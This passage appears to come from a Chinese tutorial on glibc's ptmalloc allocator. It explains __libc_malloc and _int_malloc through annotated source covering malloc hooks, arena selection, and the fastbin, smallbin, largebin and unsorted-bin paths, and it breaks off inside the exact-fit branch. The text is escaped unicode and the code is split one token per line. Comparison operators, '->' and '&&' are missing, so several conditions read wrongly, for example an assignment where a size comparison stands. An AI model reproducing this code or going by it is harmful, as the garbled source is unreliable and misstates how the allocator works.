\u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc \u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5b9e\u73b0\u3002\n\n\n__libc_malloc\n\n\n\u8be5\u51fd\u6570\u4f1a\u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09\u3002\u8be5\u51fd\u6570\u4e3b\u8981\u7528\u4e8e\u8fdb\u7a0b\u5728\u521b\u5efa\u65b0\u7ebf\u7a0b\u8fc7\u7a0b\u4e2d\u5206\u914d\u5185\u5b58\u6216\u8005\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5206\u914d\u51fd\u6570\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\n\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570\n\u3002\n\n\n// wapper for int_malloc\n\n\nvoid\n \n*\n__libc_malloc\n(\nsize_t\n \nbytes\n)\n \n{\n\n    \nmstate\n \nar_ptr\n;\n\n    \nvoid\n \n*\n \nvictim\n;\n\n    \n// \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de.\n\n    \nvoid\n \n*\n(\n*\nhook\n)(\nsize_t\n,\n \nconst\n \nvoid\n \n*\n)\n \n=\n \natomic_forced_read\n(\n__malloc_hook\n);\n\n    \nif\n \n(\n__builtin_expect\n(\nhook\n \n!=\n \nNULL\n,\n \n0\n))\n\n        \nreturn\n \n(\n*\nhook\n)(\nbytes\n,\n \nRETURN_ADDRESS\n(\n0\n));\n\n\n\n\n\n\u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002\n\n\n    \narena_get\n(\nar_ptr\n,\n \nbytes\n);\n\n\n\n\n\n\u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002\n\n\n    \nvictim\n \n=\n \n_int_malloc\n(\nar_ptr\n,\n \nbytes\n);\n\n\n\n\n\n\u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002\n\n\n    \n/* Retry with another arena only if we were able to find a usable arena\n\n\n       before.  */\n\n    \nif\n \n(\n!\nvictim\n \n \nar_ptr\n \n!=\n \nNULL\n)\n \n{\n\n        \nLIBC_PROBE\n(\nmemory_malloc_retry\n,\n \n1\n,\n \nbytes\n);\n\n        \nar_ptr\n \n=\n \narena_get_retry\n(\nar_ptr\n,\n \nbytes\n);\n\n        \nvictim\n \n=\n \n_int_malloc\n(\nar_ptr\n,\n \nbytes\n);\n\n    \n}\n\n\n\n\n\n\u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002\n\n\n    \nif\n \n(\nar_ptr\n \n!=\n \nNULL\n)\n \n__libc_lock_unlock\n(\nar_ptr\n-\nmutex\n);\n\n\n\n\n\n\u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff0c\u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58\uff0c\u8981\u4e48\u662f mmap \u7684\u5185\u5b58\uff0c\n\u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684arena\u4e2d\n\u3002\n\n\n    \nassert\n(\n!\nvictim\n \n||\n \nchunk_is_mmapped\n(\nmem2chunk\n(\nvictim\n))\n \n||\n\n           \nar_ptr\n \n==\n \narena_for_chunk\n(\nmem2chunk\n(\nvictim\n)));\n\n\n\n\n\n\u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002\n\n\n    \nreturn\n \nvictim\n;\n\n\n}\n\n\n\n\n\n_int_malloc\n\n\n_int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b\n\n\n\n\n\u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5757\u7684\u5927\u5c0f\u4ee5\u53ca\u76f8\u5e94\u5927\u5c0f chunk \u4f7f\u7528\u7684\u9891\u5ea6\uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002\n\n\n\u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u9700\u6c42\u3002\n\n\n\u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002\n\n\n\u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002\n\n\n\n\n\u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684chunk\u5927\u5c0f\u3002\n\n\nstatic\n \nvoid\n \n*\n_int_malloc\n(\nmstate\n \nav\n,\n \nsize_t\n \nbytes\n)\n \n{\n\n    \nINTERNAL_SIZE_T\n \nnb\n;\n  \n/* normalized request size */\n\n    \nunsigned\n \nint\n    \nidx\n;\n \n/* associated bin index */\n\n    \nmbinptr\n         \nbin\n;\n \n/* associated bin */\n\n\n    \nmchunkptr\n       \nvictim\n;\n       \n/* inspected/selected chunk */\n\n    \nINTERNAL_SIZE_T\n \nsize\n;\n         \n/* its size */\n\n    \nint\n             \nvictim_index\n;\n \n/* its bin index */\n\n\n    \nmchunkptr\n     \nremainder\n;\n      \n/* remainder from a split */\n\n    \nunsigned\n \nlong\n \nremainder_size\n;\n \n/* its size */\n\n\n    \nunsigned\n \nint\n \nblock\n;\n \n/* bit map traverser */\n\n    \nunsigned\n \nint\n \nbit\n;\n   \n/* bit map traverser */\n\n    \nunsigned\n \nint\n \nmap\n;\n   \n/* current word of binmap */\n\n\n    \nmchunkptr\n \nfwd\n;\n \n/* misc temp for linking */\n\n    \nmchunkptr\n \nbck\n;\n \n/* misc temp for linking */\n\n\n    \nconst\n \nchar\n \n*\nerrstr\n \n=\n \nNULL\n;\n\n\n    \n/*\n\n\n       Convert request size to internal form by adding SIZE_SZ bytes\n\n\n       overhead plus possibly more to obtain necessary alignment and/or\n\n\n       to obtain a size of at least MINSIZE, the smallest allocatable\n\n\n       size. Also, checked_request2size traps (returning 0) request sizes\n\n\n       that are so large that they wrap around zero when padded and\n\n\n       aligned.\n\n\n     */\n\n\n    \nchecked_request2size\n(\nbytes\n,\n \nnb\n);\n\n\n\n\n\narena\n\n\n    \n/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from\n\n\n       mmap.  */\n\n    \nif\n \n(\n__glibc_unlikely\n(\nav\n \n==\n \nNULL\n))\n \n{\n\n        \nvoid\n \n*\np\n \n=\n \nsysmalloc\n(\nnb\n,\n \nav\n);\n\n        \nif\n \n(\np\n \n!=\n \nNULL\n)\n \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n        \nreturn\n \np\n;\n\n    \n}\n\n\n\n\n\nfast bin\n\n\n\u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c\n\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570\n\u3002\n\u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk\n\u3002\n\n\n    \n/*\n\n\n       If the size qualifies as a fastbin, first check corresponding bin.\n\n\n       This code is safe to execute even if av is not yet initialized, so we\n\n\n       can try it without checking, which saves some time on this fast path.\n\n\n     */\n\n\n    \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nnb\n)\n \n=\n \n(\nunsigned\n \nlong\n)\n \n(\nget_max_fast\n()))\n \n{\n\n        \n// \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807\n\n        \nidx\n             \n=\n \nfastbin_index\n(\nnb\n);\n\n        \n// \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488\n\n        \nmfastbinptr\n \n*\nfb\n \n=\n \nfastbin\n(\nav\n,\n \nidx\n);\n\n        \nmchunkptr\n    \npp\n \n=\n \n*\nfb\n;\n\n        \n// \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c\n\n        \ndo\n \n{\n\n            \nvictim\n \n=\n \npp\n;\n\n            \nif\n \n(\nvictim\n \n==\n \nNULL\n)\n \nbreak\n;\n\n        \n}\n \nwhile\n \n((\npp\n \n=\n \ncatomic_compare_and_exchange_val_acq\n(\nfb\n,\n \nvictim\n-\nfd\n,\n\n                                                            \nvictim\n))\n \n!=\n \nvictim\n);\n\n        \n// \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk\n\n        \nif\n \n(\nvictim\n \n!=\n \n0\n)\n \n{\n\n            \n// \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002\n\n            \n// \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002\n\n            \n// \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002\n\n            \nif\n \n(\n__builtin_expect\n(\nfastbin_index\n(\nchunksize\n(\nvictim\n))\n \n!=\n \nidx\n,\n \n0\n))\n \n{\n\n                \nerrstr\n \n=\n \nmalloc(): memory corruption (fast)\n;\n\n            \nerrout\n:\n\n                \nmalloc_printerr\n(\ncheck_action\n,\n \nerrstr\n,\n \nchunk2mem\n(\nvictim\n),\n \nav\n);\n\n                \nreturn\n \nNULL\n;\n\n            \n}\n\n            \n// \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528\n\n            \ncheck_remalloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n            \n// \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f\n\n            \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n            \n// \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n            \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n            \nreturn\n \np\n;\n\n        \n}\n\n    \n}\n\n\n\n\n\nsmall bin\n\n\n\u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b\n\n\n    \n/*\n\n\n       If a small request, check regular bin.  Since these \nsmallbins\n\n\n       hold one size each, no searching within bins is necessary.\n\n\n       (For a large request, we need to wait until unsorted chunks are\n\n\n       processed to find best fit. But for small ones, fits are exact\n\n\n       anyway, so we can check now, which is faster.)\n\n\n     */\n\n\n    \nif\n \n(\nin_smallbin_range\n(\nnb\n))\n \n{\n\n        \n// \u83b7\u53d6 small bin \u7684\u7d22\u5f15\n\n        \nidx\n \n=\n \nsmallbin_index\n(\nnb\n);\n\n        \n// \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488\n\n        \nbin\n \n=\n \nbin_at\n(\nav\n,\n \nidx\n);\n\n        \n// \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk\n\n        \n// \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002\n\n        \n// \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5\n\n        \nif\n \n((\nvictim\n \n=\n \nlast\n(\nbin\n))\n \n!=\n \nbin\n)\n \n{\n\n            \n// \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002\n\n            \nif\n \n(\nvictim\n \n==\n \n0\n)\n \n/* initialization check */\n\n                \n// \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\n\n                \nmalloc_consolidate\n(\nav\n);\n\n            \n// \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk\n\n            \nelse\n \n{\n\n                \n// \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002\n\n                \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n                \n// \u68c0\u67e5 bck-\nfd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020\n\n                \nif\n \n(\n__glibc_unlikely\n(\nbck\n-\nfd\n \n!=\n \nvictim\n))\n \n{\n\n                    \nerrstr\n \n=\n \nmalloc(): smallbin double linked list corrupted\n;\n\n                    \ngoto\n \nerrout\n;\n\n                \n}\n\n                \n// \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d\n\n                \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                \n// \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765\n\n                \nbin\n-\nbk\n \n=\n \nbck\n;\n\n                \nbck\n-\nfd\n \n=\n \nbin\n;\n\n                \n// \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7\n\n                \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \n// \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n        \n}\n\n    \n}\n\n\n\n\n\nlarge bin\n\n\n\u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684chunk\uff0c\u800c\u662f\u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1malloc_state\u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d\uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002\n\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662fptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002\n\n\n    \n/*\n\n\n       If this is a large request, consolidate fastbins before continuing.\n\n\n       While it might look excessive to kill all fastbins before\n\n\n       even seeing if there is space available, this avoids\n\n\n       fragmentation problems normally associated with fastbins.\n\n\n       Also, in practice, programs tend to have runs of either small or\n\n\n       large requests, but less often mixtures, so consolidation is not\n\n\n       invoked all that often in most programs. And the programs that\n\n\n       it is called frequently in otherwise tend to fragment.\n\n\n     */\n\n\n    \nelse\n \n{\n\n        \n// \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002\n\n        \nidx\n \n=\n \nlargebin_index\n(\nnb\n);\n\n        \n// \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin \n\n        \nif\n \n(\nhave_fastchunks\n(\nav\n))\n \nmalloc_consolidate\n(\nav\n);\n\n    \n}\n\n\n\n\n\n\u5927\u5faa\u73af\n\n\n\u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk\u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662flarge chunk  \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406\n\u3002\n\n\n\u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c\n\n\n\n\n\u5c1d\u8bd5\u4ece unsorted bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58\n\n\n\u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58\n\n\n\u5c1d\u8bd5\u4ece top  chunk \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u5185\u5b58\n\n\n\n\n\u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914dsmall bin chunk\u3002\n\n\n    \n/*\n\n\n       Process recently freed or remaindered chunks, taking one only if\n\n\n       it is exact fit, or, if this a small request, the chunk is remainder from\n\n\n       the most recent non-exact fit.  Place other traversed chunks in\n\n\n       bins.  Note that this step is the only place in any routine where\n\n\n       chunks are placed in bins.\n\n\n\n       The outer loop here is needed because we might not realize until\n\n\n       near the end of malloc that we should have consolidated, so must\n\n\n       do so and retry. This happens at most once, and only when we would\n\n\n       otherwise need to expand memory to service a \nsmall\n request.\n\n\n     */\n\n\n    \nfor\n \n(;;)\n \n{\n\n        \nint\n \niters\n \n=\n \n0\n;\n\n\n\n\n\nunsort bin \u904d\u5386\n\n\n\u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8esmall bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002\n\n\n\u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002\n\n\n        \n// \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a\n\n        \n// First In First Out\n\n        \nwhile\n \n((\nvictim\n \n=\n \nunsorted_chunks\n(\nav\n)\n-\nbk\n)\n \n!=\n \nunsorted_chunks\n(\nav\n))\n \n{\n\n            \n// victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk\n\n            \n// bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk\n\n            \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n            \n// \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927\n\n            \n// \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K\n\n            \nif\n \n(\n__builtin_expect\n(\nchunksize_nomask\n(\nvictim\n)\n \n=\n \n2\n \n*\n \nSIZE_SZ\n,\n \n0\n)\n \n||\n\n                \n__builtin_expect\n(\nchunksize_nomask\n(\nvictim\n)\n \n \nav\n-\nsystem_mem\n,\n \n0\n))\n\n                \nmalloc_printerr\n(\ncheck_action\n,\n \nmalloc(): memory corruption\n,\n\n                                \nchunk2mem\n(\nvictim\n),\n \nav\n);\n\n            \n// \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002\n\n            \nsize\n \n=\n \nchunksize\n(\nvictim\n);\n\n\n\n\n\nsmall request\n\n\n\u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk\uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u591f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c\n\u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7\n\uff1f\n\n\n            \n/*\n\n\n               If a small request, try to use last remainder if it is the\n\n\n               only chunk in unsorted bin.  This helps promote locality for\n\n\n               runs of consecutive small requests. This is the only\n\n\n               exception to best-fit, and applies only when there is\n\n\n               no exact fit for a small chunk.\n\n\n             */\n\n\n            \nif\n \n(\nin_smallbin_range\n(\nnb\n)\n \n \nbck\n \n==\n \nunsorted_chunks\n(\nav\n)\n \n\n                \nvictim\n \n==\n \nav\n-\nlast_remainder\n \n\n                \n(\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n \n(\nunsigned\n \nlong\n)\n \n(\nnb\n \n+\n \nMINSIZE\n))\n \n{\n\n                \n/* split and reattach remainder */\n\n                \n// \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f\n\n                \nremainder_size\n          \n=\n \nsize\n \n-\n \nnb\n;\n\n                \n// \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e\n\n                \nremainder\n               \n=\n \nchunk_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                \n// \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5\n\n                \nunsorted_chunks\n(\nav\n)\n-\nbk\n \n=\n \nunsorted_chunks\n(\nav\n)\n-\nfd\n \n=\n \nremainder\n;\n\n                \n// \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder\n\n                \nav\n-\nlast_remainder\n                                \n=\n \nremainder\n;\n\n                \n// \u66f4\u65b0last remainder\u7684\u6307\u9488\n\n                \nremainder\n-\nbk\n \n=\n \nremainder\n-\nfd\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n                \nif\n \n(\n!\nin_smallbin_range\n(\nremainder_size\n))\n \n{\n\n                    \nremainder\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                    \nremainder\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n                \n}\n\n                \n// \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0c\n\n                \nset_head\n(\nvictim\n,\n \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n                                     \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n                \n// \u8bbe\u7f6e remainder \u7684\u5934\u90e8\n\n                \nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n                \n// \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002\n\n                \nset_foot\n(\nremainder\n,\n \nremainder_size\n);\n\n                \n// \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n\n\n\n\n\u521d\u59cb\u53d6\u51fa\n\n\n            \n/* remove from unsorted list */\n\n            \nunsorted_chunks\n(\nav\n)\n-\nbk\n \n=\n \nbck\n;\n\n            \nbck\n-\nfd\n                 \n=\n \nunsorted_chunks\n(\nav\n);\n\n\n\n\n\nexact fit\n\n\n\u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002\n\n\n            \n/* Take now instead of binning if exact fit */\n\n            \nif\n \n(\nsize\n \n==\n \nnb\n)\n \n{\n\n                \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nsize\n);\n\n                \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                